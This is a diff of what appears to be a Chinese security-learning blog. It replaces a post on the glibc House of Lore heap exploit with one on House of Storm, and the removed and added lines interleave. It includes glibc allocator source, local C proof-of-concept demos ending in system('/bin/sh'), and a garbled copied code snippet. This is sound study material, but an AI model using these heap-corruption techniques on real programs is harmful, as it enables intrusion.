bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             if (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             void *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             return p;</span><br><span class="line">           }</span><br><span class="line">       }</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="第一块碎片"><a href="#第一块碎片" class="headerlink" title="第一块碎片"></a>第一块碎片</h3><pre><code>  if ((victim = last (bin)) != bin)
-    {
-      if (victim == 0) /* initialization check */
-        malloc_consolidate (av);
-      else
-        {
-          bck = victim-&gt;bk;
+<p>在unsorted bin中的chunk脱链，然后链接到large bin的过程中，可以同时进行这两种攻击。为之，所以我们需要在large bin中布置一个chunk，并且在unsorted bin中布置一个size稍大于largebin的chunk，使其能够链接在large bin中chunk的后面。</p>
+<p>house of storm中，unsorted bin attack主要用到的是unsorted_chunks(av) → bk同时也被赋值为了fake（只是一个记号）。在下次申请chunk，使其进入unsorted bin的分支时，也就是利用unsorted bin attack后,bk会指向target_addr,victim = unsorted_chunks(av) → bk（即fake），<strong>紧接着会有一个分支检查其size是否满足申请</strong>。只要满足了，则会直接分配fake处为chunk返回。</p>
+<p>我们已经知道largebin attack是向任意地址赋值堆地址。在64字长的系统中，地址寻址为8字节，但堆地址只占5个字节，而特别的是仅已0x55或0x56开头。那么只要我们通过largebin attack向fake + 0x3处，赋值一个堆地址，则以fake为chunk的size处为0x55或者0x56。这样，就成功的修改了size</p>
+<p>用图简单表示的话</p>
+<p><img src="/pic/house_of_storm/0.png" alt="img"></p>
+<h2 id="导致crash的原因："><a href="#导致crash的原因：" class="headerlink" title="导致crash的原因："></a>导致crash的原因：</h2><p>在通过调试demo的时候我们发现有的时候是可以通过的，有的时候是不行的，通过调试发现，无法通过的时候是因为fake_chunk的size为0x55 只有为0x56的时候可以通过 对应的源码在_int_malloc返回到_libc_malloc</p>
+<p>/*<br>    #define arena_for_chunk(ptr) <br>        (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</p>
+<pre><code>过以下检测需要满足的要求，只需满足一条即可
+1. victim 为 0
+2. IS_MMAPPED 为 1
+3. NON_MAIN_ARENA 为 0
 </code></pre>
-<p>如果victim不是small bin的最后一个也就是未满的情况</p>
-<p>bck=victim-&gt;bk           此时bk被我们伪造为target addr   所以bck=target addr</p>
-<h3 id="第二块碎片"><a href="#第二块碎片" class="headerlink" title="第二块碎片"></a>第二块碎片</h3><pre><code>          set_inuse_bit_at_offset (victim, nb);
-          bin-&gt;bk = bck;
-          bck-&gt;fd = bin;
-</code></pre>
-<p>bin-&gt;bk=bck,这就相当于把target addr  链入small bin的开头，接下来我们就可以通过malloc把这取出来</p>
-<h3 id="第三块碎片"><a href="#第三块碎片" class="headerlink" title="第三块碎片"></a>第三块碎片</h3><p>要执行这一步要经过这个check</p>
-<pre><code>if (__glibc_unlikely (bck-&gt;fd != victim))
-            {
-              errstr = "malloc(): smallbin double linked list corrupted";
-              goto errout;
-            }
-</code></pre>
-<p>也就是bck-&gt;fd=victim  也就是说  target_addr+0x10 的位置要等于victim的地址</p>
-<h2 id="接下来通过demo演示-实验环境2-23"><a href="#接下来通过demo演示-实验环境2-23" class="headerlink" title="接下来通过demo演示(实验环境2.23)"></a>接下来通过demo演示(实验环境2.23)</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[]){</span><br><span class="line">    intptr_t* stack_buffer_1[4] = {0};</span><br><span class="line">    intptr_t* stack_buffer_2[4] = {0};</span><br><span class="line">    intptr_t *victim = malloc(0x100);</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    free(victim);</span><br><span class="line">    malloc(0x400);</span><br><span class="line">    victim[1] = &amp;stack_buffer_1; // victim_chunk_addr-&gt;bk = stack_buffer_1_addr</span><br><span class="line">    stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr</span><br><span class="line">//===============================line=================================</span><br><span class="line">    intptr_t *p1 = malloc(0x100);</span><br><span class="line">    intptr_t *p2 = malloc(0x100);//chunk on the stack</span><br><span class="line">    malloc(0x100); //failed : bck-&gt;fd != victim</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>*/<br>assert(!victim || chunk_is_mmapped(mem2chunk(victim))<br>       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</p>
+<p>0x56：0101 0110，满足第二个。</p>
+<p>0x55：0101 0101，不满足，会报错。</p>
+<h2 id="源码调试demo"><a href="#源码调试demo" class="headerlink" title="源码调试demo"></a>源码调试demo</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">struct {</span><br><span class="line">    unsigned long  presize;</span><br><span class="line">    unsigned long  size;</span><br><span class="line">    unsigned long  fd;</span><br><span class="line">    unsigned long  bk;</span><br><span class="line">    unsigned long  fd_nextsize;</span><br><span class="line">    unsigned long  bk_nextsize;</span><br><span class="line">}chunk;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    unsigned long *large_chunk,*unsorted_chunk;</span><br><span class="line">    unsigned long *fake_chunk = (unsigned long *)&amp;chunk;</span><br><span class="line">    char *ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsorted_chunk=malloc(0x418);</span><br><span class="line">    malloc(0X20);</span><br><span class="line">    large_chunk=malloc(0x408);</span><br><span class="line">    malloc(0x20);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(large_chunk);</span><br><span class="line">    free(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=malloc(0x418);</span><br><span class="line">    free(unsorted_chunk);  </span><br><span class="line"></span><br><span class="line">    unsorted_chunk[1] = (unsigned long )fake_chunk;</span><br><span class="line">    large_chunk[1]    = (unsigned long )fake_chunk+8;</span><br><span class="line">    large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x48);</span><br><span class="line">    strncpy(ptr, "/bin/sh\x00", 0x10);</span><br><span class="line">    system(((char *)fake_chunk + 0x10));</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
-<p><strong>堆块布局：</strong></p>
-<pre><code>intptr_t* stack_buffer_1[4] = {0};
-intptr_t* stack_buffer_2[4] = {0};
-intptr_t *victim = malloc(0x100);
-malloc(0x10);
-free(victim);
-malloc(0x400);
-</code></pre>
-<p><img src="/pic/house_of_lore/0.png" alt="img"></p>
-<p>此时的malloc(0x400)是为了将unsorted bin 变为small bin</p>
-<p><strong>布置攻击条件</strong></p>
-<pre><code>victim[1] = &amp;stack_buffer_1; // victim_chunk_addr-&gt;bk = stack_buffer_1_addr
-stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr
-</code></pre>
-<p><img src="/pic/house_of_lore/1.png" alt="img"></p>
-<h3 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h3><p><img src="/pic/house_of_lore/2.png" alt="img"></p>
-<p>接下来在申请一次就可以再目标地址布置堆</p>
-<p><img src="/pic/house_of_lore/3.png" alt="img"></p>
-<h2 id="2-27源码更改"><a href="#2-27源码更改" class="headerlink" title="2.27源码更改"></a>2.27源码更改</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">  if (in_smallbin_range (nb))</span><br><span class="line">    {</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      if ((victim = last (bin)) != bin)</span><br><span class="line">        {</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr ("malloc(): smallbin double linked list corrupted");</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          if (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">	  /* While we're here, if we see other chunks of the same size,</span><br><span class="line">	     stash them in the tcache.  */</span><br><span class="line">	  size_t tc_idx = csize2tidx (nb);</span><br><span class="line">	  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    {</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">	      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		{</span><br><span class="line">		  if (tc_victim != 0)</span><br><span class="line">		    {</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      if (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            }</span><br><span class="line">		}</span><br><span class="line">	    }</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+<p>布局unsorted bin和large bin</p>
+<pre><code>unsorted_chunk=malloc(0x418);
+malloc(0X20);
+large_chunk=malloc(0x408);
+malloc(0x20);
 
-<p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。</p>
-<p>高版本的情况2.31之后利用条件比较苛刻，有这利用条件 早就别的路去打io了</p>
-<p>参考文献</p>
-<p><a href="https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/</a></p>
-<p><a href="https://tty-flag.github.io/2021/04/20/House-of-lore.html">House of lore - TTY的博客 (tty-flag.github.io)</a></p>
-<p>[House Of Lore-原理 | Pwn进你的心 (ywhkkx.github.io)](<a href="https://ywhkkx.github.io/2022/03/10/House">https://ywhkkx.github.io/2022/03/10/House</a> Of Lore-原理/)</p>
+free(large_chunk);
+free(unsorted_chunk);
+unsorted_chunk=malloc(0x418);
+free(unsorted_chunk); 
+</code></pre>
+<p><img src="/pic/house_of_storm/1.png" alt="img"></p>
+<pre><code>unsorted_chunk[1] = (unsigned long )fake_chunk;
+large_chunk[1]    = (unsigned long )fake_chunk+8;
+large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;
+</code></pre>
+<p>修改使满足attack的条件</p>
+<p><img src="/pic/house_of_storm/2.png" alt="img"></p>
+<p>malloc(0x20);</p>
+<p>接下来这一步就是关键，既然触发了unsorted bin attack也触发了large bin attack</p>
+<p>我们通过调试_int_malloc</p>
+<p><img src="/pic/house_of_storm/3.png" alt="img"></p>
+<p>发现程序执行下面这段，也就是unsorted bin attack攻击的位置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">while` `((victim ``=` `unsorted_chunks (av)``-``&gt;bk) !``=` `unsorted_chunks (av))  ``/``/``从unsortbin第一个chunk（队尾）开始顺着bk指针向前遍历</span><br><span class="line">    ``{</span><br><span class="line">     ``bck ``=` `victim``-``&gt;bk;            ``/``/``bck是倒数第二个，victim是倒数第一个</span><br><span class="line">     ``/``/``size check</span><br><span class="line">     ``if` `(__builtin_expect (victim``-``&gt;size &lt;``=` `2` `*` `SIZE_SZ, ``0``)</span><br><span class="line">       ``|| __builtin_expect (victim``-``&gt;size &gt; av``-``&gt;system_mem, ``0``))</span><br><span class="line">      ``malloc_printerr (check_action, ``"malloc(): memory corruption"``,</span><br><span class="line">               ``chunk2mem (victim), av);</span><br><span class="line">     ``size ``=` `chunksize (victim);      ``/``/``取出最victim的size</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">``/``*</span><br><span class="line">  ``If a small request, ``try` `to use last remainder ``if` `it ``is` `the</span><br><span class="line">  ``only chunk ``in` `unsorted ``bin``. This helps promote locality ``for</span><br><span class="line">  ``runs of consecutive small requests. This ``is` `the only</span><br><span class="line">  ``exception to best``-``fit, ``and` `applies only when there ``is</span><br><span class="line">  ``no exact fit ``for` `a small chunk.</span><br><span class="line"> ``*``/</span><br><span class="line">``/``/``last remainder first</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/house_of_storm/4.png" alt="img"></p>
+<p>然后在执行到large bin attack的位置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">/ *Always</span><br><span class="line">insert in the</span><br><span class="line">second</span><br><span class="line">position. * /</span><br><span class="line">fwd = fwd-&gt;fd;</span><br><span class="line">else</span><br><span class="line">{</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">}</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">else</span><br><span class="line">victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/house_of_storm/5.png" alt="img"></p>
+<p>再执行完large bin attack后，可以看fake chunk</p>
+<p><img src="/pic/house_of_storm/6.png" alt="img"></p>
+<p>接下来继续走看那个检测，这里是0x55按理是过不了检测的</p>
+<p><img src="/pic/house_of_storm/7.png" alt="img"></p>
+<p><img src="/pic/house_of_storm/8.png" alt="img"></p>
+<p>如果是0x56就可以过check了</p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>一般我们触发攻击的attack是   add(0x48)，这里是因为fake_chunk的size是0x56或者0x55被视为是在0x50的范围，而如果是0x48的话就可以取出堆块，我们一般的攻击思路是覆盖hook函数挂上ogg，但是有没有想过如果不是0x48而是0x47或者0x45呢也是可以取出堆块的因为会被视为0x50，但是在attack也就是覆盖地址上会出现问题这里用一道题目的最后部分进行演示</p>
+<p>这是add(0x45)的情况</p>
+<p><img src="/pic/house_of_storm/9.png" alt="img"></p>
+<p>少了两字节</p>
+<p>这是add(0x46)的情况</p>
+<p><img src="/pic/house_of_storm/10.png" alt="img"></p>
+<p>少了一字节</p>
+<p>所以我们add(0x48)和add(0x47)都是可以的</p>
+<p>参考文章：</p>
+<p><a href="https://www.cnblogs.com/tolele/p/16728502.html">堆Pwn：House Of Storm利用手法 - tolele - 博客园 (cnblogs.com)</a></p>
+<p>[<a href="https://bbs.kanxue.com/thread-262423.htm">原创]unsortbin attack分析与总结-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
+<p><a href="https://xz.aliyun.com/t/12673?time__1311=mqmhDvqIxUxGxWqGNveequtjD8jDkY/GCYeD&amp;alichlgref=https://www.bing.com/#toc-6">House Of Storm - 先知社区 (aliyun.com)</a> </p>
 ]]></content>
       <categories>
         <category>pwn学习</category>
@@ -597,92 +683,6 @@ stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr
       </categories>
       <tags>
         <tag>house of</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>house-of-storm</title>
-    <url>/2024/08/15/house%20of%20storm/</url>
-    <content><![CDATA[<h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>House Of Storm 结合了 unsortedbin attack 和 Largebin attack 的攻击技术，其基本原理和 Largebin attack 类似，可以达到任意地址写的效果,感觉就是在原有的unsorted bin attack的过程加上了一个large bin attack攻击去修改size使得 unsorted bin 可以成功返回</p>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.glibc版本小于2.30,因为2.30之后加入了检查，unsorted bin attack无法使用<br>2.需要攻击者在largebin和unsorted_bin中分别布置一个chunk 这两个chunk需要在归位之后处于同一个largebin的index中,且unsortedbin中的chunk要比largebin中的大<br>3.需要unsorted_bin中的bk指针可控<br>4.需要largebin中的bk指针和bk_nextsize指针可控</p>
-<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>这里引用了Rookle师傅对于源码的注释</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">//#define unsorted_chunks(M)          (bin_at (M, 1))</span><br><span class="line">//如果unsorted bins不为空，从尾到头遍历unsorted bin中的每个chunk</span><br><span class="line">while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) </span><br><span class="line">{</span><br><span class="line">    bck = victim-&gt;bk;//取出unsorted的尾部的chunk</span><br><span class="line">    /*</span><br><span class="line">        检查当前遍历的 chunk 是否合法，chunk 的大小不能小于等于 2 * SIZE_SZ，</span><br><span class="line">        也不能超过 该分配区总的内存分配量。然后获取 chunk 的大小并赋值给 size。</span><br><span class="line">        这里的检查似乎有点小问题，直接使用了 victim-&gt;size，但 victim-&gt;size </span><br><span class="line">        中包含了相关的标志位信息，使用 chunksize(victim) 才比较合理，但在 </span><br><span class="line">        unsorted bin 中的空闲 chunk 的所有标志位都清零了，所以这里直接 </span><br><span class="line">        victim-&gt;size 没有问题。</span><br><span class="line">    */</span><br><span class="line">    if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">        || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))</span><br><span class="line">        malloc_printerr(check_action, "malloc(): memory corruption",</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line"></span><br><span class="line">    size = chunksize(victim);//获取victim的size</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">        如果要申请的大小在smallbin范围 且 unsorted chunks 只有一个chunk，且</span><br><span class="line">        victim是last_remainder 且 victim的size大于请求的chunk的大小nb加上</span><br><span class="line">        (MINSIZE)最小chunk的size,那么就切割remainder,然后返回victim。</span><br><span class="line"></span><br><span class="line">        last_remainder 是一个 chunk 指针，分配区上次分配 small chunk 时，</span><br><span class="line">        从一个 chunk 中分 裂出一个 small chunk 返回给用户，分裂后的剩余部分</span><br><span class="line">        形成一个 chunk，last_remainder 就是 指向的这个 chunk。</span><br><span class="line">    */</span><br><span class="line">    if (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">        bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) {</span><br><span class="line"></span><br><span class="line">        //分割remainder</span><br><span class="line">        remainder_size = size - nb;//计算分割后剩下的size</span><br><span class="line">        remainder = chunk_at_offset(victim, nb);//获取remainder的地址</span><br><span class="line">        //把remainder加入unsorted bin中</span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder; // 设置last_remainder为remainder</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        //如果是remainder在large bin的范围，则把fd_nextsize,fd_nextsize清零</span><br><span class="line">        if (!in_smallbin_range(remainder_size)) {</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">        }</span><br><span class="line">        //设置victim的size</span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                 (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">        //设置remainder的size</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        //设置remainder的物理相邻的下一个chunk的prev_size</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);//默认不做任何操作</span><br><span class="line">        void *p = chunk2mem(victim);//将chunk指针转化为mem指针</span><br><span class="line">        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做</span><br><span class="line">        return p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //把victim从unsorted bin 中移除</span><br><span class="line">    unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    //如果 victim 的size 与申请的size相等，那么就返回其。</span><br><span class="line">    if (size == nb) {</span><br><span class="line">        //设置victim物理相邻的下一个chunk的prev_inuse位</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        //如果av不是main_arena 也就是说如果不是主进程,设置NON_MAIN_ARENA位</span><br><span class="line">        if (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA; </span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb); // 默认不做任何操作</span><br><span class="line">        void *p = chunk2mem(victim);//把chunk转换为mem指针</span><br><span class="line">        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做</span><br><span class="line">        return p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //如果上一步取出的chunk没有匹配成功，那么将该chunk放入对应的bin中</span><br><span class="line">    //如果在smallbin的范围,则放到对应多small bin中</span><br><span class="line">    if (in_smallbin_range(size)) </span><br><span class="line">    {</span><br><span class="line">        victim_index = smallbin_index(size);//获取size对应的smallbin的index</span><br><span class="line">        bck = bin_at(av, victim_index);//bck指向size对应的smallbin的链表头</span><br><span class="line">        //fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">    }</span><br><span class="line">    else//如果不再smallbin的范围，也就是说在large bin 的范围</span><br><span class="line">    {</span><br><span class="line">        victim_index = largebin_index(size);//获取size对应的large bin的index</span><br><span class="line">        bck = bin_at(av, victim_index);//bck指向size对应的large bin的链表头</span><br><span class="line">        fwd = bck-&gt;fd;//fwd指向size对应的large bin的链表中的新加入的chunk</span><br><span class="line"></span><br><span class="line">        //如果large bin 非空，在largbin进行按顺序插入</span><br><span class="line">        if (fwd != bck) {</span><br><span class="line">            /* Or with inuse bit to speed comparisons */</span><br><span class="line">            size |= PREV_INUSE;</span><br><span class="line">            assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert</span><br><span class="line">            /*</span><br><span class="line">                large bin中的chunk是按从大到小排列的，如果size &lt; large bin </span><br><span class="line">                的最后一个chunk，说明size是这个large bin中的最小的，我们把它</span><br><span class="line">                加入到此large bin尾部。</span><br><span class="line">            */</span><br><span class="line">            if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) {</span><br><span class="line"></span><br><span class="line">                fwd = bck;</span><br><span class="line">                bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                /*</span><br><span class="line">                large bin 中size最小的chunk的fd_nextsize会指向size最大的</span><br><span class="line">                那个chunk，也就是首部的chunk。同样，large bin 中size最大的</span><br><span class="line">                chunk的bk_nextsize会指向size最小的那个chunk。</span><br><span class="line">                victim的bk_nextsize指向large bin原来最小的chunk，它的</span><br><span class="line">                bk_nextsize指向最大的那个chunk。那么原来的最小的就成了第二小的了。</span><br><span class="line">                把它fd_nextsize和bk_nextsize都修正。</span><br><span class="line">                */</span><br><span class="line">                victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                //最大size的chunk的bk_nextsize，和原来最小chunk的bk_nextsize都指向victim</span><br><span class="line">                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            } </span><br><span class="line">            else //如果victim不是large bin 中最小的chunk</span><br><span class="line">            {</span><br><span class="line">                assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert</span><br><span class="line">                //从大到小（从头到尾）找到合适的位置</span><br><span class="line">                while ((unsigned long) size &lt; fwd-&gt;size) {</span><br><span class="line">                    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</span><br><span class="line">                }</span><br><span class="line">                //如果size刚好相等，就直接加入到其后面省的改fd_nextsize和bk_nextsize了</span><br><span class="line">                if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">                    fwd = fwd-&gt;fd;</span><br><span class="line">                else </span><br><span class="line">                {</span><br><span class="line">                    //size不相等，即size&gt;fwd-&gt;size，把victim加入到纵向链表中</span><br><span class="line">                    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                }</span><br><span class="line">                bck = fwd-&gt;bk;</span><br><span class="line">            }</span><br><span class="line">        } </span><br><span class="line">        else //如果large bin 为空，将victim加入到纵向列表</span><br><span class="line">            victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    //#define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="line">    mark_bin(av, victim_index); //把victim加入到的bin的表示为非空</span><br><span class="line">    //把victim加入到large bin的链表中</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<p>在unsorted bin中的chunk脱链，然后链接到large bin的过程中，可以同时进行这两种攻击。为之，所以我们需要在large bin中布置一个chunk，并且在unsorted bin中布置一个size稍大于largebin的chunk，使其能够链接在large bin中chunk的后面。</p>
-<p>house of storm中，unsorted bin attack主要用到的是unsorted_chunks(av) → bk同时也被赋值为了fake（只是一个记号）。在下次申请chunk，使其进入unsorted bin的分支时，也就是利用unsorted bin attack后,bk会指向target_addr,victim = unsorted_chunks(av) → bk（即fake），<strong>紧接着会有一个分支检查其size是否满足申请</strong>。只要满足了，则会直接分配fake处为chunk返回。</p>
-<p>我们已经知道largebin attack是向任意地址赋值堆地址。在64字长的系统中，地址寻址为8字节，但堆地址只占5个字节，而特别的是仅已0x55或0x56开头。那么只要我们通过largebin attack向fake + 0x3处，赋值一个堆地址，则以fake为chunk的size处为0x55或者0x56。这样，就成功的修改了size</p>
-<p>用图简单表示的话</p>
-<p><img src="/pic/house_of_storm/0.png" alt="img"></p>
-<h2 id="导致crash的原因："><a href="#导致crash的原因：" class="headerlink" title="导致crash的原因："></a>导致crash的原因：</h2><p>在通过调试demo的时候我们发现有的时候是可以通过的，有的时候是不行的，通过调试发现，无法通过的时候是因为fake_chunk的size为0x55 只有为0x56的时候可以通过 对应的源码在_int_malloc返回到_libc_malloc</p>
-<p>/*<br>    #define arena_for_chunk(ptr) <br>        (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</p>
-<pre><code>过以下检测需要满足的要求，只需满足一条即可
-1. victim 为 0
-2. IS_MMAPPED 为 1
-3. NON_MAIN_ARENA 为 0
-</code></pre>
-<p>*/<br>assert(!victim || chunk_is_mmapped(mem2chunk(victim))<br>       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</p>
-<p>0x56：0101 0110，满足第二个。</p>
-<p>0x55：0101 0101，不满足，会报错。</p>
